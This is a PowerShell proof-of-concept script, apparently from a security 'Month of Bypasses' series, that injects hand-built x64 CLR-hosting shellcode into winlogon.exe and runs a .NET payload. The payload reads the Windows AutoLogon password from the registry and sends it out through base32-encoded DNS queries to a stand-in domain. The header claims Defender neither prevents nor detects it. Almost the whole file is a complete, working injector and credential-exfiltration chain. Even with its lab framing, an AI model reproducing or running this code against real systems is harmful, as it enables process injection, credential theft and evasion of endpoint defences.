# Month of Bypasses #3 — Winlogon CLR Injection with DNS Credential Exfiltration
# MITRE ATT&CK T1055.002 — Process Injection: Portable Executable Injection
#
# Injects x64 CLR-hosting shellcode into winlogon.exe via CreateRemoteThread.
# The shellcode bootstraps .NET CLR inside winlogon, then calls
# ExecuteInDefaultAppDomain to run a payload that reads AutoLogon credentials
# from registry and exfiltrates them via DNS (DnsQuery_A to base32 subdomains).
#
# WARNING: CLR runtime (~8MB) remains loaded in winlogon.exe until reboot.
#          No active threads persist after execution — memory is inert.
#          Use in dedicated lab/test environments only.
#
# Requires: Windows 11, PowerShell running as SYSTEM/Administrator
# Tested:   Windows 11 23H2, Defender latest signatures (May 2026)
# Result:   NOT PREVENTED, NOT DETECTED

# =============================================================================
# Stage 0: Plant a random credential in Winlogon AutoLogon registry keys
# This simulates a real-world scenario where AutoLogon credentials are stored.
# The random value ensures the payload must read dynamically (no hardcoding).
# =============================================================================
$r = -join ((65..90) + (48..57) | Get-Random -Count 12 | ForEach-Object {[char]$_})
$secret = "N9-$r"
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -Value $secret
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -Value "1"
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -Value "LabUser"
Write-Output "[*] Planted credential: $secret"

# =============================================================================
# Stage 1: Identify target process — winlogon.exe
# =============================================================================
$wl = (Get-Process winlogon | Select-Object -First 1)
$wlPid = $wl.Id
Write-Output "[*] Target: winlogon.exe (PID: $wlPid)"

# =============================================================================
# Stage 2: Compile .NET payload DLL
# This DLL executes INSIDE winlogon.exe after CLR injection succeeds.
# It reads DefaultPassword from registry, base32-encodes it, performs DNS
# exfiltration via DnsQuery_A to *.k.exfil-not-exist.example, and writes
# a proof file containing PID + credential + DNS query evidence.
# =============================================================================
$src = @'
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using Microsoft.Win32;

public class PL {
    [DllImport("dnsapi.dll")]
    static extern int DnsQuery_A(string n, ushort t, uint o, IntPtr e, ref IntPtr r, IntPtr v);
    [DllImport("dnsapi.dll")]
    static extern void DnsFree(IntPtr d, int t);

    static string B32(byte[] d) {
        const string a = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        var sb = new StringBuilder();
        int bit = 0, val = 0;
        foreach (byte b in d) {
            val = (val << 8) | b; bit += 8;
            while (bit >= 5) { sb.Append(a[(val >> (bit - 5)) & 0x1F]); bit -= 5; }
        }
        if (bit > 0) sb.Append(a[(val << (5 - bit)) & 0x1F]);
        return sb.ToString();
    }

    public static int Run(string arg) {
        // Get our PID (we're running inside winlogon.exe)
        int pid = Process.GetCurrentProcess().Id;

        // Read the AutoLogon credential from registry
        string cred = (string)Registry.GetValue(
            @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
            "DefaultPassword", "");
        if (string.IsNullOrEmpty(cred)) return 1;

        // Base32-encode and exfiltrate via DNS A-record query
        string enc = B32(Encoding.ASCII.GetBytes(cred));
        string q = enc + ".k.exfil-not-exist.example";
        IntPtr r = IntPtr.Zero;
        DnsQuery_A(q, 1, 0, IntPtr.Zero, ref r, IntPtr.Zero);
        if (r != IntPtr.Zero) DnsFree(r, 1);

        // Write proof file with evidence
        File.WriteAllText(@"C:\Windows\Temp\exfil_proof.txt",
            "PID:" + pid + "\nCRED:" + cred + "\nEXFIL:" + q + "\n");
        return 0;
    }
}
'@
$src | Out-File .\clr_p.cs -Encoding ASCII
$csc = Join-Path ([Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()) 'csc.exe'
& $csc /target:library /platform:x64 /out:.\clr_p.dll .\clr_p.cs 2>&1 | Out-Null
if (!(Test-Path .\clr_p.dll)) { Write-Output '[-] FAIL: csc.exe compilation failed'; exit 1 }
$dllFullPath = (Resolve-Path .\clr_p.dll).Path
Write-Output "[+] Payload DLL compiled: $dllFullPath"

# =============================================================================
# Stage 3: Build the injector
# This C# class runs in the CURRENT PowerShell process and handles:
#   - Opening winlogon.exe with PROCESS_ALL_ACCESS
#   - Allocating memory pages in winlogon (data page RW, code page RWX)
#   - Writing CLR hosting strings, COM GUIDs, and shellcode
#   - Creating a remote thread to execute the shellcode
#
# The injector uses direct kernel32 P/Invoke — no D/Invoke, no syscall
# unhooking, no evasion tricks. The simplest possible approach.
# =============================================================================
Add-Type -Language CSharp @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

public class WinlogonCLRInjector {
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr m, string n);
    [DllImport("kernel32")] public static extern IntPtr OpenProcess(uint a, bool b, int p);
    [DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr b, byte[] buf, uint s, out uint w);
    [DllImport("kernel32")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr st, IntPtr p, uint f, out uint tid);
    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint ms);
    [DllImport("kernel32")] public static extern bool CloseHandle(IntPtr h);

    public static string Inject(int pid, string dll) {
        // Open winlogon.exe with full access
        IntPtr hP = OpenProcess(0x1F0FFF, false, pid);
        if (hP == IntPtr.Zero) return "FAIL:OpenProcess";

        long k32 = GetModuleHandle("kernel32.dll").ToInt64();
        long llA = GetProcAddress((IntPtr)k32, "LoadLibraryA").ToInt64();
        long gpa = GetProcAddress((IntPtr)k32, "GetProcAddress").ToInt64();

        // --- Data Page (PAGE_READWRITE) ---
        // Contains all strings and GUIDs the shellcode references
        IntPtr dB = VirtualAllocEx(hP, IntPtr.Zero, 0x4000, 0x3000, 0x04);
        if (dB == IntPtr.Zero) return "FAIL:VirtualAllocEx(data)";
        uint w; long dA = dB.ToInt64();

        // CLR hosting function names (ASCII, null-terminated)
        byte[] s1 = Encoding.ASCII.GetBytes("mscoree.dll\0");
        WriteProcessMemory(hP, (IntPtr)(dA), s1, (uint)s1.Length, out w);
        byte[] s2 = Encoding.ASCII.GetBytes("CLRCreateInstance\0");
        WriteProcessMemory(hP, (IntPtr)(dA + 0x20), s2, (uint)s2.Length, out w);

        // CLR runtime version (Unicode)
        byte[] s3 = Encoding.Unicode.GetBytes("v4.0.30319\0");
        WriteProcessMemory(hP, (IntPtr)(dA + 0x40), s3, (uint)s3.Length, out w);

        // Payload DLL path (Unicode)
        byte[] s4 = Encoding.Unicode.GetBytes(dll + "\0");
        WriteProcessMemory(hP, (IntPtr)(dA + 0x80), s4, (uint)s4.Length, out w);

        // ExecuteInDefaultAppDomain parameters (Unicode)
        byte[] s5 = Encoding.Unicode.GetBytes("PL\0");       // Type name
        WriteProcessMemory(hP, (IntPtr)(dA + 0x200), s5, (uint)s5.Length, out w);
        byte[] s6 = Encoding.Unicode.GetBytes("Run\0");      // Method name
        WriteProcessMemory(hP, (IntPtr)(dA + 0x220), s6, (uint)s6.Length, out w);
        byte[] s7 = Encoding.Unicode.GetBytes("go\0");       // Argument
        WriteProcessMemory(hP, (IntPtr)(dA + 0x240), s7, (uint)s7.Length, out w);

        // COM interface GUIDs for CLR hosting
        // CLSID_CLRMetaHost {9280188d-0e8e-4867-b30c-7fa83884e8de}
        Guid g1 = new Guid("9280188d-0e8e-4867-b30c-7fa83884e8de");
        WriteProcessMemory(hP, (IntPtr)(dA + 0x300), g1.ToByteArray(), 16, out w);
        // IID_ICLRMetaHost {D332DB9E-B9B3-4125-8207-A14884F53216}
        Guid g2 = new Guid("D332DB9E-B9B3-4125-8207-A14884F53216");
        WriteProcessMemory(hP, (IntPtr)(dA + 0x310), g2.ToByteArray(), 16, out w);
        // CLSID_CLRRuntimeHost {90F1A06E-7712-4762-86B5-7A5EBA6BDB02}
        Guid g3 = new Guid("90F1A06E-7712-4762-86B5-7A5EBA6BDB02");
        WriteProcessMemory(hP, (IntPtr)(dA + 0x320), g3.ToByteArray(), 16, out w);
        // IID_ICLRRuntimeHost {90F1A06C-7712-4762-86B5-7A5EBA6BDB02}
        Guid g4 = new Guid("90F1A06C-7712-4762-86B5-7A5EBA6BDB02");
        WriteProcessMemory(hP, (IntPtr)(dA + 0x330), g4.ToByteArray(), 16, out w);
        // IID_ICLRRuntimeInfo {BD39D1D2-BA2F-486a-89B0-B4B0CB466891}
        Guid g5 = new Guid("BD39D1D2-BA2F-486a-89B0-B4B0CB466891");
        WriteProcessMemory(hP, (IntPtr)(dA + 0x340), g5.ToByteArray(), 16, out w);

        // --- Shellcode (x64 CLR Hosting Chain) ---
        // Executes inside winlogon.exe and performs:
        //   1. LoadLibraryA("mscoree.dll")
        //   2. GetProcAddress(hMscoree, "CLRCreateInstance")
        //   3. CLRCreateInstance(&CLSID_MetaHost, &IID_MetaHost, &pMH)
        //   4. pMH->GetRuntime(L"v4.0.30319", &IID_RuntimeInfo, &pRI)  [vtbl[3]]
        //   5. pRI->GetInterface(&CLSID_RH, &IID_RH, &pRH)            [vtbl[9]]
        //   6. pRH->Start()                                            [vtbl[3]]
        //   7. pRH->ExecuteInDefaultAppDomain(dll, type, method, arg)  [vtbl[11]]
        var ms = new MemoryStream(); var bw = new BinaryWriter(ms);
        // Prologue: sub rsp, 0x78
        bw.Write(new byte[]{0x48,0x83,0xEC,0x78});
        // LoadLibraryA("mscoree.dll")
        bw.Write((byte)0x48); bw.Write((byte)0xB9); bw.Write(dA);        // mov rcx, &"mscoree.dll"
        bw.Write((byte)0x48); bw.Write((byte)0xB8); bw.Write(llA);       // mov rax, LoadLibraryA
        bw.Write(new byte[]{0xFF,0xD0});                                  // call rax
        // GetProcAddress(hMscoree, "CLRCreateInstance")
        bw.Write(new byte[]{0x48,0x89,0xC1});                             // mov rcx, rax
        bw.Write((byte)0x48); bw.Write((byte)0xBA); bw.Write(dA + 0x20); // mov rdx, &"CLRCreateInstance"
        bw.Write((byte)0x48); bw.Write((byte)0xB8); bw.Write(gpa);       // mov rax, GetProcAddress
        bw.Write(new byte[]{0xFF,0xD0});                                  // call rax
        bw.Write(new byte[]{0x48,0x89,0xC6});                             // mov rsi, rax (save ptr)
        // CLRCreateInstance(&CLSID, &IID, &pMetaHost)
        bw.Write((byte)0x48); bw.Write((byte)0xB9); bw.Write(dA + 0x300);
        bw.Write((byte)0x48); bw.Write((byte)0xBA); bw.Write(dA + 0x310);
        bw.Write(new byte[]{0x4C,0x8D,0x44,0x24,0x60});                  // lea r8, [rsp+0x60]
        bw.Write(new byte[]{0xFF,0xD6});                                  // call rsi
        // pMH->GetRuntime(L"v4.0.30319", &IID_RI, &pRI)
        bw.Write(new byte[]{0x48,0x8B,0x4C,0x24,0x60});                  // mov rcx, [rsp+0x60]
        bw.Write(new byte[]{0x48,0x8B,0x01});                             // mov rax, [rcx] (vtable)
        bw.Write((byte)0x48); bw.Write((byte)0xBA); bw.Write(dA + 0x40);
        bw.Write((byte)0x49); bw.Write((byte)0xB8); bw.Write(dA + 0x340);
        bw.Write(new byte[]{0x4C,0x8D,0x4C,0x24,0x58});                  // lea r9, [rsp+0x58]
        bw.Write(new byte[]{0xFF,0x50,0x18});                             // call [rax+0x18]
        // pRI->GetInterface(&CLSID_RH, &IID_RH, &pRH)
        bw.Write(new byte[]{0x48,0x8B,0x4C,0x24,0x58});
        bw.Write(new byte[]{0x48,0x8B,0x01});
        bw.Write((byte)0x48); bw.Write((byte)0xBA); bw.Write(dA + 0x320);
        bw.Write((byte)0x49); bw.Write((byte)0xB8); bw.Write(dA + 0x330);
        bw.Write(new byte[]{0x4C,0x8D,0x4C,0x24,0x50});
        bw.Write(new byte[]{0xFF,0x50,0x48});                             // call [rax+0x48]
        // pRH->Start()
        bw.Write(new byte[]{0x48,0x8B,0x4C,0x24,0x50});
        bw.Write(new byte[]{0x48,0x8B,0x01});
        bw.Write(new byte[]{0xFF,0x50,0x18});                             // call [rax+0x18]
        // pRH->ExecuteInDefaultAppDomain(dll, "PL", "Run", "go", &ret)
        bw.Write(new byte[]{0x48,0x8B,0x4C,0x24,0x50});
        bw.Write(new byte[]{0x48,0x8B,0x01});
        bw.Write((byte)0x48); bw.Write((byte)0xBA); bw.Write(dA + 0x80);  // rdx = dll path
        bw.Write((byte)0x49); bw.Write((byte)0xB8); bw.Write(dA + 0x200); // r8 = "PL"
        bw.Write((byte)0x49); bw.Write((byte)0xB9); bw.Write(dA + 0x220); // r9 = "Run"
        bw.Write((byte)0x48); bw.Write((byte)0xBB); bw.Write(dA + 0x240); // rbx = "go"
        bw.Write(new byte[]{0x48,0x89,0x5C,0x24,0x20});                   // [rsp+0x20] = arg
        bw.Write(new byte[]{0x48,0x8D,0x5C,0x24,0x48});                   // lea rbx, [rsp+0x48]
        bw.Write(new byte[]{0x48,0x89,0x5C,0x24,0x28});                   // [rsp+0x28] = &retval
        bw.Write(new byte[]{0xFF,0x50,0x58});                              // call [rax+0x58]
        // Epilogue: add rsp, 0x78; ret
        bw.Write(new byte[]{0x48,0x83,0xC4,0x78,0xC3});
        byte[] sc = ms.ToArray();

        // --- Code Page (PAGE_EXECUTE_READWRITE) ---
        IntPtr cB = VirtualAllocEx(hP, IntPtr.Zero, (uint)(sc.Length + 0x100), 0x3000, 0x40);
        if (cB == IntPtr.Zero) return "FAIL:VirtualAllocEx(code)";
        WriteProcessMemory(hP, cB, sc, (uint)sc.Length, out w);

        // --- Fire: Create remote thread at shellcode entry ---
        uint tid;
        IntPtr hT = CreateRemoteThread(hP, IntPtr.Zero, 0, cB, IntPtr.Zero, 0, out tid);
        if (hT == IntPtr.Zero) { CloseHandle(hP); return "FAIL:CreateRemoteThread"; }
        WaitForSingleObject(hT, 60000);
        CloseHandle(hT);
        CloseHandle(hP);
        return "OK";
    }
}
"@

# =============================================================================
# Stage 4: Execute — Inject CLR hosting shellcode into winlogon.exe
# =============================================================================
Write-Output "[*] Injecting CLR hosting shellcode into winlogon.exe..."
$result = [WinlogonCLRInjector]::Inject($wlPid, $dllFullPath)
Write-Output "[*] Injection result: $result"

if ($result -ne "OK") {
    Write-Output "[-] Injection failed: $result"
    exit 1
}

# =============================================================================
# Stage 5: Collect proof — Wait for payload execution, retrieve evidence
# =============================================================================
Start-Sleep -Seconds 5
if (Test-Path C:\Windows\Temp\exfil_proof.txt) {
    Copy-Item C:\Windows\Temp\exfil_proof.txt .\exfil_proof.txt -Force
    Write-Output "[+] Proof file retrieved:"
    Get-Content .\exfil_proof.txt
} else {
    Write-Output "[-] Proof file not found — payload may not have executed"
    exit 1
}

# =============================================================================
# Verification: Confirm CLR is loaded in winlogon
# =============================================================================
$mods = (Get-Process winlogon | Select-Object -First 1).Modules | ForEach-Object { $_.ModuleName.ToLower() }
if ('clrjit.dll' -in $mods -or 'coreclr.dll' -in $mods) {
    Write-Output "[+] SUCCESS: CLR confirmed loaded in winlogon.exe"
    Write-Output "[+] Credential exfiltrated via DNS without detection"
} else {
    Write-Output "[-] CLR not detected in winlogon modules"
}
